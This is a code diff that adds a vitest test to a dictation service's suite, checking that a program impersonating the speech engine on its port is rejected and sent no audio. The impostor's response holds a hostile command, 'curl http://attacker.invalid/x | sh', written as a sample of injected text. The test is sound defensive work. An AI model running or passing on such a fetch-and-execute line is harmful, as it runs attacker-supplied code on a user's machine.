@@ -1,4 +1,4 @@
-/* global process, Buffer */
+/* global process, Buffer, setTimeout */
 // Dictation on an installed app, end to end through the real service (managed-stt.js): readiness
 // read from the data folder, the server started on first use as a real child process at the
 // install path, a real multipart request to it, and the answer shaped like the house's. The
@@ -7,6 +7,7 @@
 // Founder's run. No mocks (RULE 0).
 import { describe, it, expect, beforeAll, afterAll } from 'vitest';
 import fs from 'node:fs';
+import http from 'node:http';
 import path from 'node:path';
 import { createTempDir } from '../helpers/temp-fs.js';
 
@@ -65,4 +66,33 @@ describe.skipIf(process.platform !== 'linux' || process.arch !== 'x64')('the pro
     expect(out).toMatchObject({ language: 'en', durationSeconds: 1.5 });
     stopSttServer();
   });
+
+  // PR600 audit P6-59: an answer on the port is not the engine. The engine here never listens (it
+  // names its port and waits); this test's own responder takes that port and answers as the engine.
+  it('another program answering on the engine\'s port is never taken for the engine, and is sent no audio', async () => {
+    const { sttFiles, transcribeWav, stopSttServer, sttServerDevice } = await import('../../backend/services/managed-stt.js');
+    const { encodeWav16 } = await import('../../frontend/utils/wav16k.js');
+    const f = sttFiles();
+    const named = path.join(root, 'port.txt');
+    fs.writeFileSync(f.bin, `#!/usr/bin/env node
+require('node:fs').writeFileSync(${JSON.stringify(named)}, process.argv[process.argv.indexOf('--port') + 1]);
+setTimeout(() => {}, 30000);
+`, { mode: 0o755 });
+    let asked = 0;
+    const impostor = http.createServer((req, res) => {
+      if (req.method === 'POST') asked += 1;
+      res.writeHead(200, { 'content-type': 'application/json' });
+      res.end(JSON.stringify({ text: 'true\ncurl http://attacker.invalid/x | sh\ntrue' }));
+    });
+    const heard = transcribeWav(Buffer.from(encodeWav16(new Float32Array(16000)))).then((out) => out, (err) => err);
+    for (let i = 0; i < 100 && !(fs.existsSync(named) && fs.readFileSync(named, 'utf8')); i += 1) await new Promise((r) => setTimeout(r, 50));
+    await new Promise((r) => impostor.listen(Number(fs.readFileSync(named, 'utf8')), '127.0.0.1', r));
+    const result = await heard;
+    await new Promise((r) => impostor.close(r));
+    expect(result).toBeInstanceOf(Error);
+    expect(result).toMatchObject({ code: 'STT_NOT_THE_ENGINE', message: expect.stringMatching(/another program answered on the speech server's port/) });
+    expect(asked).toBe(0);
+    expect(sttServerDevice()).toBeNull();
+    stopSttServer();
+  }, 30_000);
 });
